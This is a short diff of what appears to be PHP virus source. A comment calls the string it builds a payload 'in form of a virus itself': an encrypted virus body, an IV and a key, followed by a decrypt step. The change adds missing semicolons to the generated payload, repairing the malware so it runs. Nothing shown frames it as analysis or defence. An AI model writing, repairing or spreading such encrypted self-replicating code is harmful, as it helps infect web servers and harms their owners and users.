@@ -31,8 +31,8 @@
         //payload in form of a virus itself.
         $payload = "
             \$encodedVirus = '$encodedVirus';
-            \$iv = '$encodedIV'
-            \$key = '$encodedKey'
+            \$iv = '$encodedIV';
+            \$key = '$encodedKey';
         
 
             //Decrypt
